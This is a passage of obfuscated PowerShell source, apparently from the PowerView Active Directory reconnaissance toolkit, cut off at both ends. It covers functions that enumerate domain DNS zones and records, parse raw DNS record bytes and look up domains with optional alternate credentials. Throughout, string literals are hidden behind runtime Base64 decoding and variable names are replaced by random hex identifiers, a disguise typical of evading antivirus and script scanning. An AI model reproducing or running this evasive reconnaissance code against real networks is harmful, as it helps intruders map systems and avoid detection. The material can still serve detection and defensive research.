${148160fac3314bdc82ee9f4c583c0c4a}.ServerTimeLimit = 
$ServerTimeLimit
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) {
            
${148160fac3314bdc82ee9f4c583c0c4a}.Tombstone = $True
        }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
   
         ${148160fac3314bdc82ee9f4c583c0c4a}.filter = $LDAPFilter
    
    }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) {
            
${148160fac3314bdc82ee9f4c583c0c4a}.SecurityMasks = Switch 
($SecurityMasks) {
                
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Dacl 
}
                $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwByAG8AdQBwAA=='))) { 
[System.DirectoryServices.SecurityMasks]::Group }
                
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBvAG4AZQA='))) { [System.DirectoryServices.SecurityMasks]::None 
}
                $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwB3AG4AZQByAA=='))) { 
[System.DirectoryServices.SecurityMasks]::Owner }
                
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Sacl 
}
            }
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            
${1ada186e4487448bbc014f5453ec6b8e} = $Properties| ForEach-Object { 
$_.Split(',') }
            $Null = 
${148160fac3314bdc82ee9f4c583c0c4a}.PropertiesToLoad.AddRange
((${1ada186e4487448bbc014f5453ec6b8e}))
        }
        
${148160fac3314bdc82ee9f4c583c0c4a}
    }
}
function Convert-DNSRecord 
{
    [OutputType('System.Management.Automation.PSCustomObject')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        
[Byte[]]
        $DNSRecord
    )
    BEGIN {
        function Get-Name 
{
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
       
     Param(
                [Byte[]]
                $Raw
            
)
            [Int]${5034a14b90f94a1caf6211a987bb39fb} = $Raw[0]
      
      [Int]${447ce628269048229addf86ff528e0ff} = $Raw[1]
            
[Int]${c68528a70f324585a5d8f3a63646d980} =  2
            
[String]$Name  = ''
            while 
(${447ce628269048229addf86ff528e0ff}-- -gt 0)
            {
           
     [Int]${7115f1b205aa46c684bc9f1ae420e130} = $Raw
[${c68528a70f324585a5d8f3a63646d980}++]
                while 
(${7115f1b205aa46c684bc9f1ae420e130}-- -gt 0) {
                    
$Name += [Char]$Raw[${c68528a70f324585a5d8f3a63646d980}++]
           
     }
                $Name += "."
            }
            $Name
     
   }
    }
    PROCESS {
        ${0cf06095c4254a1aacab40205fe32c30} = 
[BitConverter]::ToUInt16($DNSRecord, 2)
        
${7a1e1b647c2f4cab96a0599cf35db588} = [BitConverter]::ToUInt32
($DNSRecord, 8)
        ${bad446db94fa4b9e9dffa9b90fa70bcf} = 
$DNSRecord[12..15]
        $Null = [array]::Reverse
(${bad446db94fa4b9e9dffa9b90fa70bcf})
        
${f51202c44bae4d4fb0d5bad17a914963} = [BitConverter]::ToUInt32
(${bad446db94fa4b9e9dffa9b90fa70bcf}, 0)
        
${237ec902b53d476aa42320854ca1a0b5} = [BitConverter]::ToUInt32
($DNSRecord, 20)
        if (${237ec902b53d476aa42320854ca1a0b5} -ne 
0) {
            ${8dcc8c6c907d4169928a89980680b3d0} = ((Get-Date -
Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours
(${237ec902b53d476aa42320854ca1a0b5})).ToString()
        }
        
else {
            ${8dcc8c6c907d4169928a89980680b3d0} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBzAHQAYQB0AGkAYwBdAA==')))
        }
        
${f9d582aceea74e1d82c5cc0e32aa7f9a} = New-Object PSObject
        if 
(${0cf06095c4254a1aacab40205fe32c30} -eq 1) {
            
${fbb9e2f3ac22424bb689cc73c06faa60} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ewAwAH0ALgB7ADEAfQAuAHsAMgB9AC4AewAzAH0A'))) -f $DNSRecord[24], 
$DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            
${c16670fe41c44c08bd4632d2f6fdcfff} = 
${fbb9e2f3ac22424bb689cc73c06faa60}
            
${f9d582aceea74e1d82c5cc0e32aa7f9a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'A'
        }
        elseif 
(${0cf06095c4254a1aacab40205fe32c30} -eq 2) {
            
${88a3eb5e8b824cac876a9af6313dcf1a} = Get-Name $DNSRecord[24..
$DNSRecord.length]
            ${c16670fe41c44c08bd4632d2f6fdcfff} = 
${88a3eb5e8b824cac876a9af6313dcf1a}
            
${f9d582aceea74e1d82c5cc0e32aa7f9a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'NS'
        }
        elseif 
(${0cf06095c4254a1aacab40205fe32c30} -eq 5) {
            $Alias = 
Get-Name $DNSRecord[24..$DNSRecord.length]
            
${c16670fe41c44c08bd4632d2f6fdcfff} = $Alias
            
${f9d582aceea74e1d82c5cc0e32aa7f9a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBOAEEATQBFAA==')))
        }
        elseif 
(${0cf06095c4254a1aacab40205fe32c30} -eq 6) {
            
${c16670fe41c44c08bd4632d2f6fdcfff} = 
$([System.Convert]::ToBase64String($DNSRecord[24..
$DNSRecord.length]))
            ${f9d582aceea74e1d82c5cc0e32aa7f9a} 
| Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBPAEEA')))
        }
        elseif 
(${0cf06095c4254a1aacab40205fe32c30} -eq 12) {
            
${f3b66f4ce515446aa2eba6c90aa51c50} = Get-Name $DNSRecord[24..
$DNSRecord.length]
            ${c16670fe41c44c08bd4632d2f6fdcfff} = 
${f3b66f4ce515446aa2eba6c90aa51c50}
            
${f9d582aceea74e1d82c5cc0e32aa7f9a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABUAFIA')))
        }
        elseif 
(${0cf06095c4254a1aacab40205fe32c30} -eq 13) {
            
${c16670fe41c44c08bd4632d2f6fdcfff} = 
$([System.Convert]::ToBase64String($DNSRecord[24..
$DNSRecord.length]))
            ${f9d582aceea74e1d82c5cc0e32aa7f9a} 
| Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SABJAE4ARgBPAA==')))
        }
        elseif 
(${0cf06095c4254a1aacab40205fe32c30} -eq 15) {
            
${c16670fe41c44c08bd4632d2f6fdcfff} = 
$([System.Convert]::ToBase64String($DNSRecord[24..
$DNSRecord.length]))
            ${f9d582aceea74e1d82c5cc0e32aa7f9a} 
| Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'MX'
  
      }
        elseif (${0cf06095c4254a1aacab40205fe32c30} -eq 16) 
{
            [string]${78bf7f58c5e14cc99794a02b3d4161f1}  = ''
       
     [int]${7115f1b205aa46c684bc9f1ae420e130} = $DNSRecord[24]
       
     ${c68528a70f324585a5d8f3a63646d980} = 25
            while 
(${7115f1b205aa46c684bc9f1ae420e130}-- -gt 0) {
                
${78bf7f58c5e14cc99794a02b3d4161f1} += [char]$DNSRecord
[${c68528a70f324585a5d8f3a63646d980}++]
            }
            
${c16670fe41c44c08bd4632d2f6fdcfff} = 
${78bf7f58c5e14cc99794a02b3d4161f1}
            
${f9d582aceea74e1d82c5cc0e32aa7f9a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABYAFQA')))
        }
        elseif 
(${0cf06095c4254a1aacab40205fe32c30} -eq 28) {
            
${c16670fe41c44c08bd4632d2f6fdcfff} = 
$([System.Convert]::ToBase64String($DNSRecord[24..
$DNSRecord.length]))
            ${f9d582aceea74e1d82c5cc0e32aa7f9a} 
| Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBBAEEAQQA=')))
        }
        elseif 
(${0cf06095c4254a1aacab40205fe32c30} -eq 33) {
            
${c16670fe41c44c08bd4632d2f6fdcfff} = 
$([System.Convert]::ToBase64String($DNSRecord[24..
$DNSRecord.length]))
            ${f9d582aceea74e1d82c5cc0e32aa7f9a} 
| Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBSAFYA')))
        }
        else {
            
${c16670fe41c44c08bd4632d2f6fdcfff} = 
$([System.Convert]::ToBase64String($DNSRecord[24..
$DNSRecord.length]))
            ${f9d582aceea74e1d82c5cc0e32aa7f9a} 
| Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBOAEsATgBPAFcATgA=')))
        }
        
${f9d582aceea74e1d82c5cc0e32aa7f9a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBwAGQAYQB0AGUAZABBAHQAUwBlAHIAaQBhAGwA'))) 
${7a1e1b647c2f4cab96a0599cf35db588}
        
${f9d582aceea74e1d82c5cc0e32aa7f9a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABUAEwA'))) ${f51202c44bae4d4fb0d5bad17a914963}
        
${f9d582aceea74e1d82c5cc0e32aa7f9a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBnAGUA'))) ${237ec902b53d476aa42320854ca1a0b5}
        
${f9d582aceea74e1d82c5cc0e32aa7f9a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABpAG0AZQBTAHQAYQBtAHAA'))) ${8dcc8c6c907d4169928a89980680b3d0}
   
     ${f9d582aceea74e1d82c5cc0e32aa7f9a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABhAHQAYQA='))) ${c16670fe41c44c08bd4632d2f6fdcfff}
        
${f9d582aceea74e1d82c5cc0e32aa7f9a}
    }
}
function Get-DomainDNSZone 
{
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        
[String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        
[Alias('DomainController')]
        [String]
        $Server,
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
     
   [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        
$FindOne,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
${ea43c787582f45539b7f519da4680c7a} = @{
            'LDAPFilter' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBaAG8AbgBlACkA')))
       
 }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${929dee5c27d24629a13970f50ef435e3} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
        if 
(${929dee5c27d24629a13970f50ef435e3}) {
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${929dee5c27d24629a13970f50ef435e3}.FindOne()  }
            else { 
${9f78951ba80c437e9db41515f07bc24e} = 
${929dee5c27d24629a13970f50ef435e3}.FindAll() }
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                ${6f675a112d04499c838f32bbba9fa15a} = 
Convert-LDAPProperty -Properties $_.Properties
                
${6f675a112d04499c838f32bbba9fa15a} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WgBvAG4AZQBOAGEAbQBlAA=='))) 
${6f675a112d04499c838f32bbba9fa15a}.name
                
${6f675a112d04499c838f32bbba9fa15a}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
              
  ${6f675a112d04499c838f32bbba9fa15a}
            }
            if 
(${9f78951ba80c437e9db41515f07bc24e}) {
                try { 
${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                catch 
{
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARQByAHIAbw
ByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AH
MAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            
}
            ${929dee5c27d24629a13970f50ef435e3}.dispose()
        }
  
      ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBOAD0ATQBpAGMAcgBvAHMAbwBmAHQARABOAFMALABEAEMAPQBEAG8AbQBhAGkAbg
BEAG4AcwBaAG8AbgBlAHMA')))
        
${cc047930b0014340aa21df0e4f819127} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
        if 
(${cc047930b0014340aa21df0e4f819127}) {
            try {
             
   if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${cc047930b0014340aa21df0e4f819127}.FindOne() }
                else 
{ ${9f78951ba80c437e9db41515f07bc24e} = 
${cc047930b0014340aa21df0e4f819127}.FindAll() }
                
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                    ${6f675a112d04499c838f32bbba9fa15a} = 
Convert-LDAPProperty -Properties $_.Properties
                    
${6f675a112d04499c838f32bbba9fa15a} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WgBvAG4AZQBOAGEAbQBlAA=='))) 
${6f675a112d04499c838f32bbba9fa15a}.name
                    
${6f675a112d04499c838f32bbba9fa15a}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
              
      ${6f675a112d04499c838f32bbba9fa15a}
                }
           
     if (${9f78951ba80c437e9db41515f07bc24e}) {
                    
try { ${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                
    catch {
                        Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8Acg
AgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzAC
AAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                    }
              
  }
            }
            catch {
                Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8Acg
AgAGEAYwBjAGUAcwBzAGkAbgBnACAAJwBDAE4APQBNAGkAYwByAG8AcwBvAGYAdABEAE
4AUwAsAEQAQwA9AEQAbwBtAGEAaQBuAEQAbgBzAFoAbwBuAGUAcwAnAA==')))
       
     }
            ${cc047930b0014340aa21df0e4f819127}.dispose()
      
  }
    }
}
function Get-DomainDNSRecord {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0,  
Mandatory = $True, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        
[ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,
        
[ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $Properties = 
'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        
$FindOne,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
${ea43c787582f45539b7f519da4680c7a} = @{
            'LDAPFilter' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBOAG8AZABlACkA')))
       
     'SearchBasePrefix' = "DC=
$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${db829e34d5884e3ba56a159f5ca0cb69} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
        if 
(${db829e34d5884e3ba56a159f5ca0cb69}) {
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${db829e34d5884e3ba56a159f5ca0cb69}.FindOne() }
            else { 
${9f78951ba80c437e9db41515f07bc24e} = 
${db829e34d5884e3ba56a159f5ca0cb69}.FindAll() }
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                try {
                    
${6f675a112d04499c838f32bbba9fa15a} = Convert-LDAPProperty -
Properties $_.Properties | Select-Object 
name,distinguishedname,dnsrecord,whencreated,whenchanged
             
       ${6f675a112d04499c838f32bbba9fa15a} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WgBvAG4AZQBOAGEAbQBlAA=='))) $ZoneName
                    if 
(${6f675a112d04499c838f32bbba9fa15a}.dnsrecord -is 
[System.DirectoryServices.ResultPropertyValueCollection]) {
          
              ${9297e969b4d9458fbaa430723196c3cb} = Convert-
DNSRecord -DNSRecord ${6f675a112d04499c838f32bbba9fa15a}.dnsrecord
[0]
                    }
                    else {
                   
     ${9297e969b4d9458fbaa430723196c3cb} = Convert-DNSRecord -
DNSRecord ${6f675a112d04499c838f32bbba9fa15a}.dnsrecord
              
      }
                    if (${9297e969b4d9458fbaa430723196c3cb}) 
{
                        
${9297e969b4d9458fbaa430723196c3cb}.PSObject.Properties | ForEach-
Object {
                            
${6f675a112d04499c838f32bbba9fa15a} | Add-Member NoteProperty 
$_.Name $_.Value
                        }
                    }
       
             
${6f675a112d04499c838f32bbba9fa15a}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBSAGUAYwBvAHIAZAA='))))
          
          ${6f675a112d04499c838f32bbba9fa15a}
                }
       
         catch {
                    Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFIAZQBjAG8AcgBkAF0AIABFAHIAcg
BvAHIAOgAgACQAXwA=')))
                    
${6f675a112d04499c838f32bbba9fa15a}
                }
            }
    
        if (${9f78951ba80c437e9db41515f07bc24e}) {
                
try { ${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                
catch {
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFIAZQBjAG8AcgBkAF0AIABFAHIAcg
BvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAH
QAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            
}
            ${db829e34d5884e3ba56a159f5ca0cb69}.dispose()
        }
  
  }
}
function Get-Domain {
    [OutputType
([System.DirectoryServices.ActiveDirectory.Domain])]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        
[String]
        $Domain,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbg
BhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBEAG
8AbQBhAGkAbgA=')))
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) {
                $TargetDomain = $Domain
    
        }
            else {
                $TargetDomain = 
$Credential.GetNetworkCredential().Domain
                Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbw
BtAGEAaQBuACAAJwAkAFQAYQByAGcAZQB0AEQAbwBtAGEAaQBuACcAIABmAHIAbwBtAC
AALQBDAHIAZQBkAGUAbgB0AGkAYQBsAA==')))
            }
            
${fcc5a08dd51c4cf99ae89f4205bbb673} = New-Object 
System.DirectoryServices.ActiveDirectory.DirectoryContext
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A'))), $TargetDomain, $Credential.UserName, 
$Credential.GetNetworkCredential().Password)
            try {
        
        
[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain
(${fcc5a08dd51c4cf99ae89f4205bbb673})
            }
            catch 
{
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQ
BkACAAZABvAG0AYQBpAG4AIAAnACQAVABhAHIAZwBlAHQARABvAG0AYQBpAG4AJwAgAG
QAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIA
BiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAdABoAGUAcgBlACAAaQBzAG4AJwB0AC
AAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ACwAIABvAHIAIAB0AGgAZQ
AgAHMAcABlAGMAaQBmAGkAZQBkACAAYwByAGUAZABlAG4AdABpAGEAbABzACAAYQByAG
UAIABpAG4AdgBhAGwAaQBkADoAIAAkAF8A')))
            }
        }
        
elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
